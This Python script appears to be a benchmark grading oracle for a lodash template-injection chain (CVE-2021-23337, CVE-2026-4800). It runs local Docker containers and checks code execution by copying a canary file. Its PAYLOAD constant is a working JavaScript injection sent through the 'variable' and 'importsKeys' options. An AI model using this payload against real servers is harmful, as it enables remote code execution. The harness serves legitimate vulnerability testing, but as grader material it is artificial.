#!/usr/bin/env python3
"""Flag differential oracle for lodash-cve-2026-4800.

Chain: CVE-2021-23337 (options.variable RCE, fixed 4.17.21)
     -> CVE-2026-4800 (options.imports key RCE, fixed 4.18.0).

V0 = lodash 4.17.20 (both injectable)
V1 = lodash 4.17.21 (variable fix; imports still injectable)  <- the target
V2 = lodash 4.18.0   (imports fix)

The injected default-parameter payload writes /canary.txt content to /tmp/pwn.txt;
the probe reads it back via `docker exec ... cat /tmp/pwn.txt` (rce-oob canary).
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import FlagOracle, new_flag, validate_case_strict  # noqa: E402

sys.path.insert(0, str(HERE))
from original_poc import candidate as original_candidate  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()

BASE = {
    "v0": "http://127.0.0.1:55110",
    "v1": "http://127.0.0.1:55111",
    "v2": "http://127.0.0.1:55112",
}
CONTAINER = {
    "v0": "lodash-cve-2026-4800-v0-1",
    "v1": "lodash-cve-2026-4800-v1-1",
    "v2": "lodash-cve-2026-4800-v2-1",
}

PAYLOAD = 'x=process.getBuiltinModule("fs").writeFileSync("/tmp/pwn.txt", process.getBuiltinModule("fs").readFileSync("/canary.txt"))'


def run_probe(candidate, *, version="v1"):
    """Send the POST trigger, then read back /tmp/pwn.txt from the container."""
    base = BASE[version]
    body = candidate.get("body")
    import urllib.request
    req = urllib.request.Request(base + "/compile", data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            http_status = r.status
    except Exception as e:
        http_status = getattr(e, "code", None)
    # read back the canary dump (OOB)
    proc = subprocess.run(["docker", "exec", CONTAINER[version], "cat", "/tmp/pwn.txt"],
                          capture_output=True, text=True, check=False)
    if proc.returncode != 0:
        return {"version": version, "status": http_status, "body": "", "oob": "no-file"}
    return {"version": version, "status": http_status, "body": proc.stdout}


def original_poc(*, version="v1"):
    return run_probe({"body": {"source": "X", "variable": PAYLOAD}}, version=version)


def bypass_poc(*, version="v1"):
    return run_probe({"body": {"source": "X", "importsKeys": [PAYLOAD]}}, version=version)


def mechanism_scope(candidate) -> bool:
    body = candidate.get("body", {}) if isinstance(candidate, dict) else {}
    return ("variable" in body) or ("importsKeys" in body)


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, run_probe, mechanism_scope)
    o.prime_seed(original_poc)
    return o


def gate() -> dict:
    return validate_case_strict(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
        bypass_on_v2=bypass_poc(version="v2"),
    )


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _clear_pwn(version: str):
    subprocess.run(["docker", "exec", CONTAINER[version], "rm", "-f", "/tmp/pwn.txt"],
                   capture_output=True, text=True, check=False)


def _wait_ready(version: str, token: str, tries: int = 40) -> bool:
    for _ in range(tries):
        try:
            import urllib.request
            with urllib.request.urlopen(BASE[version] + "/health", timeout=3) as r:
                if r.status == 404 or r.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(2)
    return False


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "build", env=env)
    if r.returncode != 0:
        return {"error": "build failed", "stderr": r.stderr[-2000:]}
    r = _compose(*_profile_flags(profiles), "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    for v in profiles:
        _clear_pwn(v)
        _wait_ready(v, FLAG)
    result = gate()
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
